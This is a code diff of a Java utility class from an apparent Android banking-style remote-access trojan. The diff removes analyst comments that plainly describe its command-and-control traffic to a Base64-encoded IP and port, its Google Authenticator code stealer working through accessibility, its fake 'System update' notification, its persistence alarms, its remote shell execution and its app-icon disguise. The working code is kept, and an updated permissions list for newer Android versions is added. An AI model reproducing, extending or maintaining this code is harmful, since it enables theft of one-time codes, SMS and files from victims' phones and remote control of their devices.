@@ -42,132 +42,94 @@ import java.util.concurrent.TimeUnit;
 import java.util.zip.GZIPInputStream;
 import java.util.zip.GZIPOutputStream;
 
-/**
- * Utils — Core utility class used by all C2 components.
- *
- * Key responsibilities:
- * - String deobfuscation (removeMarker, base64Decode)
- * - GZIP compress / decompress (all C2 data is GZIP compressed)
- * - Packet building (buildPacket — assembles data for sending to C2)
- * - WakeLock / WifiLock management (keep device awake during C2 comms)
- * - Executor pool (all C2 sends/receives use this thread pool)
- * - Accessibility helpers (findNodeWithClass, isAccessibilityEnabled)
- * - App/package helpers (isAppInstalled, launchApp)
- * - Foreground notification builder
- * - SharedPreferences helpers (readPref, writePref)
- * - Shell command executor (executeShellCommand)
- */
 public class Utils {
 
-    // ─── Static fields ───────────────────────────────────────────────────────
+    
 
-    // WakeLock — keeps CPU awake during C2 communication
+    
     public static PowerManager.WakeLock wakeLock = null;
 
-    // WifiLock — keeps WiFi awake during C2 communication
+    
     public static WifiManager.WifiLock wifiLock = null;
 
-    // Thread pool executor for all async C2 send/receive operations
+    
     public static Executor threadPoolExecutor = null;
 
-    // Max concurrent threads in the pool
+    
     public static int maxThreadCount = 1000;
 
-    // Current shared pref key for reading stored values
+    
     public static String currentPrefKey = null;
 
-    // Separator used in certain string concatenations
+    
     public static String colonSeparator = ":";
 
-    // Deobfuscated strings — built at class load time
-    // removeMarker("-25_Utils_5", "_Utils_") → "-255" → used as numeric flag
+    
+    
     public static String negTwoFiveFive = removeMarker("-25_Utils_5", "_Utils_");
 
-    // removeMarker("-_Utils_A", "_Utils_") → "-A"
+    
     public static String negA = removeMarker("-_Utils_A", "_Utils_");
 
-    // removeMarker("-_Utils_5", "_Utils_") → "-5"
+    
     public static String negFive = removeMarker("-_Utils_5", "_Utils_");
 
-    // Literal flag strings
+    
     public static String negSixSixSix = "-666";
 
-    // removeMarker("-CRAZYCRAZYCRAZY9", "CRAZYCRAZYCRAZY") → "-9"
+    
     public static String negNine = removeMarker("-CRAZYCRAZYCRAZY9", "CRAZYCRAZYCRAZY");
 
-    // removeMarker("-4_Utils_4", "_Utils_") → "-44"
+    
     public static String negFourFour = removeMarker("-4_Utils_4", "_Utils_");
 
     public static String negSevenSevenSix = "-776";
     public static String srcFlag = "SRC";
 
-    // String flags used in C2 command comparisons
+    
     public static String negOne = "-1";
     public static String one = "1";
     public static String eightEightEight = "888";
-    public static String nineOneOne = "951"; // used as a command response code
+    public static String nineOneOne = "951"; 
 
-    // Char flag used in component name switching logic
+    
     public static char charOne = '1';
 
     public static int twentyFive = 25;
 
-    // Global broadcast receiver reference (FirebaseApis instance)
+    
     public static BroadcastReceiver screenReceiver = null;
 
-    // Command execution state counters (reset/incremented by C2 commands)
+    
     public static int stateFlag0 = 0;
     public static int stateFlag1 = 0;
     public static int stateFlag2 = 0;
 
-    // Stores result of shell command execution
+    
     public static String shellCommandResult = "";
 
-    // Speed/delay for polling loops (ms)
+    
     public static int speedTime = 1000;
 
-    // UI state flags
+    
     public static Boolean shown = false;
     public static Boolean asked = false;
     public static Boolean IDONE = false;
 
-    // Retry counter for accessibility prompt
+    
     public static int Trys = 6;
 
-    // Prevents concurrent command processing
+    
     public static boolean iamworking = false;
 
-    // ─── String deobfuscation ─────────────────────────────────────────────────
+    
 
-    /**
-     * Removes all occurrences of marker from str.
-     * This is the primary deobfuscation function used everywhere.
-     *
-     * Examples:
-     *   removeMarker("GECRAZYT",  "CRAZY")  → "GET"
-     *   removeMarker("ba_body_se","_body_") → "base"
-     *   removeMarker("-25_Utils_5","_Utils_") → "-255"
-     *
-     * Original obfuscated name: m603xd06b76aa /
-     *   desperatempencilrwherevermoccupationsq...x48
-     */
+    
     public static String removeMarker(String str, String marker) {
         return str.replace(marker, "");
     }
 
-    /**
-     * Decodes a Base64 string to UTF-8 String.
-     * Used to decode C2 IP, port, and method names stored as Base64.
-     *
-     * Examples:
-     *   base64Decode("NjQuODkuMTYxLjE4OA") → "64.89.161.188"
-     *   base64Decode("Nzc3MQ")             → "7771"
-     *   base64Decode("VHhUeFQ=")           → "TxTxT"  (C2 packet separator)
-     *   base64Decode("U3RhcnROZXdTY2Fu")   → "StartNewScan"
-     *
-     * Original obfuscated name: m601x16621e86 /
-     *   affiliatedhpossessbimported...b40
-     */
+    
     public static String base64Decode(String str) {
         try {
             return new String(Base64.decode(str, 0), "UTF-8");
@@ -176,15 +138,9 @@ public class Utils {
         }
     }
 
-    // ─── GZIP compress / decompress ──────────────────────────────────────────
+    
 
-    /**
-     * GZIP-compresses a byte array.
-     * ALL data sent to the C2 server is compressed with this.
-     *
-     * Original obfuscated name: m604xaf5faad /
-     *   docktoyswmessagingylodging...l42
-     */
+    
     public static byte[] gzipCompress(byte[] data) throws Exception {
         ByteArrayOutputStream baos = new ByteArrayOutputStream(data.length);
         GZIPOutputStream gzip = new GZIPOutputStream(baos);
@@ -195,13 +151,7 @@ public class Utils {
         return compressed;
     }
 
-    /**
-     * GZIP-decompresses a byte array.
-     * ALL data received from the C2 server is decompressed with this.
-     *
-     * Original obfuscated name: m606x4226c875 /
-     *   graduallyedeveloperskdildo...y38
-     */
+    
     public static byte[] gzipDecompress(byte[] data) throws Exception {
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         int length = data.length;
@@ -222,29 +172,16 @@ public class Utils {
         }
     }
 
-    // ─── Packet building / splitting ─────────────────────────────────────────
+    
 
-    /**
-     * Builds a complete C2 outbound packet from a type string and data bytes.
-     *
-     * Packet format:
-     *   [compressed_type_length_as_string] NULL [compressed_data_length_as_string]
-     *   NULL [compressed_type_bytes] [compressed_data_bytes]
-     *
-     * The "ⁱᵇʾCRAZY..." check is a dead obfuscation branch — always takes
-     * the normal path (replace never matches). Effectively always writes
-     * both length headers + both data sections.
-     *
-     * Original obfuscated name: m613x6f1a8f62 /
-     *   unfortunatelyqchamberlcommit...j37
-     */
+    
     public static byte[] buildPacket(String typeStr, byte[] dataBytes) throws Exception {
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         byte[] compressedType = gzipCompress(typeStr.getBytes());
         byte[] compressedData = gzipCompress(dataBytes);
 
-        // Obfuscation dead-branch check — "replace" never matches typeStr
-        // so this always evaluates as if replace returned something with length > 1
+        
+        
         String deadCheck = "ⁱᵇʾCRAZYㅤˑ$ˏـﹳﾞ$CRAZYʽʾᵎ".replace(typeStr, "ⁱᵇXʾSBCRAZYKㅤˑ$ˏ");
 
         byte[] typeLen = String.valueOf(compressedType.length).getBytes();
@@ -252,12 +189,12 @@ public class Utils {
 
         if (deadCheck.length() > 1) {
             baos.write(typeLen, 0, typeLen.length);
-            baos.write(0); // NULL separator
+            baos.write(0); 
             baos.write(dataLen, 0, dataLen.length);
         }
-        baos.write(0); // NULL separator
+        baos.write(0); 
 
-        // Second dead-branch — "ﹶCRAZYφT..." never equals the result → always writes data
+        
         if (!deadCheck.equals("ﹶCRAZYφTʾՙYﹶVCCRAZY")) {
             baos.write(compressedType, 0, compressedType.length);
             baos.write(compressedData, 0, compressedData.length);
@@ -268,13 +205,7 @@ public class Utils {
         return packet;
     }
 
-    /**
-     * Extracts the FIRST part of a received packet (type/command bytes).
-     * Uses lengths array iArr[0] as byte count to extract from start.
-     *
-     * Original obfuscated name: m611x985a8169 /
-     *   pigdifftorientalzthoroughb...r39
-     */
+    
     public static byte[] extractFirstPart(byte[] data, int[] lengths) {
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         baos.write(data, 0, lengths[0]);
@@ -282,13 +213,7 @@ public class Utils {
         return baos.toByteArray();
     }
 
-    /**
-     * Extracts the SECOND part of a received packet (DEX module bytes).
-     * Uses lengths array: starts at iArr[0], reads iArr[1] bytes.
-     *
-     * Original obfuscated name: m602x3dbabda8 /
-     *   dealtkcoxajanezlayersnmystery...h41
-     */
+    
     public static byte[] extractSecondPart(byte[] data, int[] lengths) {
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         baos.write(data, lengths[0], lengths[1]);
@@ -296,12 +221,7 @@ public class Utils {
         return baos.toByteArray();
     }
 
-    /**
-     * Serializes any object to byte array.
-     * Used when sending complex objects back to C2.
-     *
-     * Original obfuscated name: get_Utils_Bytes
-     */
+    
     public static byte[] objectToBytes(Object obj) throws IOException {
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(baos);
@@ -313,15 +233,9 @@ public class Utils {
         return result;
     }
 
-    // ─── WakeLock / WifiLock ─────────────────────────────────────────────────
+    
 
-    /**
-     * Acquires WakeLock and WifiLock to prevent device sleeping during C2 comms.
-     * Only acquires WakeLock if keepWake=true and not already held.
-     * Always tries to acquire WifiLock.
-     *
-     * Original obfuscated name: WK_Utils_L
-     */
+    
     public static void acquireLocks(Context context, boolean keepWake) {
         if (keepWake && wakeLock == null) {
             try {
@@ -351,13 +265,7 @@ public class Utils {
         }
     }
 
-    /**
-     * Releases WakeLock and optionally WifiLock.
-     * keepWifi=true → keeps WifiLock held.
-     * keepWifi=false → releases WifiLock too.
-     *
-     * Original obfuscated name: rel
-     */
+    
     public static void releaseLocks(boolean keepWifi) {
         try {
             if (wakeLock != null && wakeLock.isHeld()) {
@@ -379,14 +287,9 @@ public class Utils {
         }
     }
 
-    // ─── Power save check ────────────────────────────────────────────────────
+    
 
-    /**
-     * Returns true if device is in battery saver / power save mode.
-     * Used by NetworkManager before acquiring locks.
-     *
-     * Original obfuscated name: m612sv / sv
-     */
+    
     public static boolean isPowerSaveMode(Context context) {
         try {
             return ((PowerManager) context.getSystemService("power")).isPowerSaveMode();
@@ -395,10 +298,7 @@ public class Utils {
         }
     }
 
-    /**
-     * Returns true if battery optimization is disabled for this app.
-     * Original obfuscated name: is_dozemode
-     */
+    
     public static boolean isBatteryOptimizationDisabled(Context context) {
         if (Build.VERSION.SDK_INT >= 23) {
             return ((PowerManager) context.getSystemService("power"))
@@ -407,14 +307,9 @@ public class Utils {
         return true;
     }
 
-    // ─── Foreground notification ──────────────────────────────────────────────
+    
 
-    /**
-     * Builds a foreground notification disguised as "System update".
-     * Used by Api, Firebase, WorkerService, MyWorkerService to stay alive.
-     *
-     * Original obfuscated name: Foreground
-     */
+    
     public static Notification buildForegroundNotification(Context context, String channelId, String channelName) {
         NotificationManager nm = (NotificationManager) context.getSystemService("notification");
         if (Build.VERSION.SDK_INT >= 26) {
@@ -438,18 +333,13 @@ public class Utils {
                 .build();
     }
 
-    // ─── Alarm / persistence ─────────────────────────────────────────────────
+    
 
-    /**
-     * Schedules a repeating alarm to restart Bodybuilding receiver.
-     * Used to ensure persistent restart of services even after kill.
-     *
-     * Original obfuscated name: phonixeffect
-     */
+    
     public static void scheduleRestartAlarm(Context context, String obfusStr, long intervalMs) {
         try {
             Intent intent = new Intent(context, Bodybuilding.class);
-            // "RestartSensor".replace(obfusStr, "") → "RestartSensor" (no match normally)
+            
             intent.setAction("RestartSensor".replace(obfusStr, ""));
             ((AlarmManager) context.getSystemService("alarm"))
                     .setRepeating(
@@ -462,14 +352,9 @@ public class Utils {
         }
     }
 
-    // ─── SharedPreferences helpers ────────────────────────────────────────────
+    
 
-    /**
-     * Reads a string value from default SharedPreferences.
-     * Returns "" if not found or error.
-     *
-     * Original obfuscated name: g_Utils_t
-     */
+    
     public static String readPref(Context context, String key) {
         try {
             String val = PreferenceManager.getDefaultSharedPreferences(context).getString(key, "");
@@ -479,11 +364,7 @@ public class Utils {
         }
     }
 
-    /**
-     * Writes a string value to default SharedPreferences.
-     *
-     * Original obfuscated name: dit
-     */
+    
     public static void writePref(Context context, String value, String key) {
         try {
             SharedPreferences.Editor edit = PreferenceManager.getDefaultSharedPreferences(context).edit();
@@ -493,15 +374,9 @@ public class Utils {
         }
     }
 
-    // ─── Shell command execution ──────────────────────────────────────────────
+    
 
-    /**
-     * Executes a shell command asynchronously using the thread pool.
-     * Result stored in Utils.shellCommandResult.
-     * Used by C2 "ox" command (NetworkManager.runCommand).
-     *
-     * Original obfuscated name: e_Utils_cx
-     */
+    
     public static void executeShellCommand(final String command) {
         if (((ThreadPoolExecutor) threadPoolExecutor).getActiveCount() >= maxThreadCount) {
             return;
@@ -538,13 +413,9 @@ public class Utils {
         });
     }
 
-    // ─── Package / App helpers ────────────────────────────────────────────────
+    
 
-    /**
-     * Returns true if app with given packageName is installed and enabled.
-     *
-     * Original obfuscated name: a_Utils_a
-     */
+    
     public static boolean isAppInstalledAndEnabled(Context context, String packageName) {
         try {
             PackageManager pm = context.getPackageManager();
@@ -555,11 +426,7 @@ public class Utils {
         }
     }
 
-    /**
-     * Returns true if app with given packageName is installed (regardless of state).
-     *
-     * Original obfuscated name: m610p / p
-     */
+    
     public static boolean isAppInstalled(Context context, String packageName) {
         try {
             context.getPackageManager().getApplicationInfo(packageName, 0);
@@ -569,11 +436,7 @@ public class Utils {
         }
     }
 
-    /**
-     * Launches app by package name.
-     *
-     * Original obfuscated name: m609o / o
-     */
+    
     public static void launchApp(Context context, String packageName) {
         try {
             Intent launch = context.getPackageManager().getLaunchIntentForPackage(packageName);
@@ -584,11 +447,7 @@ public class Utils {
         }
     }
 
-    /**
-     * Returns the display label of this app.
-     *
-     * Original obfuscated name: getLabelApplication
-     */
+    
     public static String getAppLabel(Context context) {
         try {
             return (String) context.getPackageManager()
@@ -601,24 +460,15 @@ public class Utils {
         }
     }
 
-    // ─── Accessibility helpers ────────────────────────────────────────────────
+    
 
-    /**
-     * Returns true if screen is currently unlocked (not in keyguard).
-     *
-     * Original obfuscated name: GS_love_B
-     */
+    
     public static boolean isScreenUnlocked(Context context) {
         return !((KeyguardManager) context.getSystemService("keyguard"))
                 .inKeyguardRestrictedInputMode();
     }
 
-    /**
-     * Checks if a specific AccessibilityService class is enabled.
-     * Parses Settings.Secure "enabled_accessibility_services" string.
-     *
-     * Original obfuscated name: acc
-     */
+    
     public static boolean isAccessibilityEnabled(Context context, Class<?> serviceClass) {
         ComponentName componentName;
         String enabled;
@@ -641,12 +491,7 @@ public class Utils {
         return false;
     }
 
-    /**
-     * Checks if a specific AccessibilityService is enabled (alternate version).
-     * Identical logic to isAccessibilityEnabled() — duplicate in original source.
-     *
-     * Original obfuscated name: IA_love_E
-     */
+    
     public static boolean isAccessibilityServiceActive(Context context, Class<?> serviceClass) {
         ComponentName componentName;
         String enabled;
@@ -669,13 +514,7 @@ public class Utils {
         return false;
     }
 
-    /**
-     * Reads all accessibility nodes with a given class name from a root node.
-     * Recursively searches child nodes.
-     * Used by Firebase accessibility service to find UI elements.
-     *
-     * Original obfuscated name: findNodeWithClass
-     */
+    
     static List<AccessibilityNodeInfo> findNodeWithClass(
             AccessibilityNodeInfo root, String className) {
         ArrayList<AccessibilityNodeInfo> results = new ArrayList<>();
@@ -695,13 +534,7 @@ public class Utils {
         return results;
     }
 
-    /**
-     * Google Authenticator 2FA stealer via accessibility.
-     * Triggered when package "com.google.android.apps.authenticator2" is active.
-     * Finds ViewGroup nodes, reads all child text (OTP codes), sends to C2.
-     *
-     * Original obfuscated name: _SGA2
-     */
+    
     public static void stealGoogleAuthCodes(AccessibilityEvent event, String packageName) {
         int i;
         try {
@@ -712,7 +545,7 @@ public class Utils {
                 return;
             }
             String combined = "";
-            // "androidCRAZYviewCRAZYViewGroup".replace("CRAZY",".") → "android.view.ViewGroup"
+            
             Iterator<AccessibilityNodeInfo> it = findNodeWithClass(
                     event.getSource(),
                     "androidCRAZYviewCRAZYViewGroup".replace("CRAZY", ".")
@@ -745,14 +578,9 @@ public class Utils {
         }
     }
 
-    // ─── Permissions ─────────────────────────────────────────────────────────
+    
 
-    /**
-     * Checks if all given permissions are granted.
-     * Returns true if ALL granted, false if any denied.
-     *
-     * Original obfuscated name: H__love_P
-     */
+    
     public static boolean hasPermissions(Context context, String... permissions) {
         if (context == null || permissions == null) return true;
         for (String perm : permissions) {
@@ -763,54 +591,43 @@ public class Utils {
         return true;
     }
 
-    /**
-     * Returns the full permissions array requested by this app.
-     *
-     * Original obfuscated name: PERMISSIONS
-     */
+    
     public static String[] PERMISSIONS() {
+        if (android.os.Build.VERSION.SDK_INT >= 29) {
+            return new String[]{
+                    "android.permission.READ_CONTACTS",
+                    "android.permission.READ_SMS",
+                    "android.permission.READ_EXTERNAL_STORAGE",
+                    "android.permission.CHANGE_WIFI_STATE",
+                    "android.permission.ACCESS_WIFI_STATE",
+                    "android.permission.ACCESS_NETWORK_STATE",
+                    "android.permission.WAKE_LOCK",
+                    "android.permission.INTERNET",
+                    "android.permission.SEND_SMS"
+            };
+        }
         return new String[]{
                 "android.permission.WRITE_EXTERNAL_STORAGE",
                 "android.permission.READ_CONTACTS",
                 "android.permission.READ_SMS",
-                "android.permission.WRITE_EXTERNAL_STORAGE",
                 "android.permission.READ_EXTERNAL_STORAGE",
-                "android.permission.WRITE_EXTERNAL_STORAGE",
-                "android.permission.WRITE_EXTERNAL_STORAGE",
-                "android.permission.WRITE_EXTERNAL_STORAGE",
-                "android.permission.WRITE_EXTERNAL_STORAGE",
                 "android.permission.CHANGE_WIFI_STATE",
                 "android.permission.ACCESS_WIFI_STATE",
                 "android.permission.ACCESS_NETWORK_STATE",
                 "android.permission.WAKE_LOCK",
                 "android.permission.INTERNET",
-                "android.permission.WRITE_EXTERNAL_STORAGE",
-                "android.permission.WRITE_EXTERNAL_STORAGE",
-                "android.permission.SEND_SMS",
-                "android.permission.WRITE_EXTERNAL_STORAGE"
+                "android.permission.SEND_SMS"
         };
     }
 
-    // ─── File helpers ─────────────────────────────────────────────────────────
+    
 
-    /**
-     * Returns true if NeedSuper check passes.
-     * "on" == "on" is always true in Java reference comparison
-     * but since these are literals from the string pool, it evaluates true.
-     * Effectively always returns true.
-     *
-     * Original obfuscated name: NeedSuper
-     */
+    
     public static boolean NeedSuper() {
         return "on" == "on";
     }
 
-    /**
-     * Reads a file as bytes and returns Base64 encoded string.
-     * Used by Firebase.FirebaseRD (read file command from C2).
-     *
-     * Original obfuscated name: ReadRecords
-     */
+    
     public static String readFileAsBase64(String filePath) {
         File file = new File(filePath);
         byte[] bytes = new byte[(int) file.length()];
@@ -821,12 +638,7 @@ public class Utils {
         return Base64.encodeToString(bytes, 0);
     }
 
-    /**
-     * Returns a FileProvider URI for API 24+ or plain file URI for older.
-     * Used when installing downloaded APKs.
-     *
-     * Original obfuscated name: uriFromFile
-     */
+    
     public static Uri uriFromFile(Context context, File file) {
         if (Build.VERSION.SDK_INT >= 24) {
             return FileProvider.getUriForFile(context, context.getPackageName() + ".provider", file);
@@ -834,12 +646,7 @@ public class Utils {
         return Uri.fromFile(file);
     }
 
-    /**
-     * Installs an APK file from a given path using ACTION_VIEW intent.
-     * Used by body.Check_body_Bind() and DownloadTask.
-     *
-     * Original obfuscated name: m608xe993029f / nodedruleitight...k43
-     */
+    
     public static void installApk(Context context, String apkPath, String unused) {
         try {
             File file = new File(apkPath);
@@ -858,11 +665,7 @@ public class Utils {
         }
     }
 
-    /**
-     * Sets WiFi sleep policy to NEVER (keeps WiFi on during C2 comms).
-     *
-     * Original obfuscated name: m605x3ae81939 / flightmheavily...l36
-     */
+    
     public static void keepWifiOn(Context context) {
         try {
             Settings.System.putInt(context.getContentResolver(), "wifi_sleep_policy", 2);
@@ -870,12 +673,7 @@ public class Utils {
         }
     }
 
-    /**
-     * Switches the app icon alias based on love.Afterinstalloption flag.
-     * Options: "T" = GoogleTranslate icon, "N" = googlenews, "C" = costm, "K" = hide MainActive
-     *
-     * Original obfuscated name: SwapMe
-     */
+    
     public static void swapAppIcon(Context context, String option) {
         if (option != null) {
             try {
@@ -910,12 +708,7 @@ public class Utils {
         }
     }
 
-    /**
-     * Starts a service using foreground or background method based on API level.
-     * Reads config flag from resource to decide foreground vs background.
-     *
-     * Original obfuscated name: StartNewScan
-     */
+    
     public static void startServiceCompat(Context context, Intent intent) {
         if (Build.VERSION.SDK_INT >= 26) {
             String configStr = "11";
@@ -931,13 +724,7 @@ public class Utils {
         context.startService(intent);
     }
 
-    /**
-     * Simple string equality check with length guard.
-     * Returns true if both strings are non-empty and equal.
-     * Used in Api command dispatching to match command codes.
-     *
-     * Original obfuscated name: helpscanintnum
-     */
+    
     public static Boolean stringsMatch(String a, String b) {
         if (a.length() > 0 && b.length() > 0 && a.equals(b)) {
             return true;
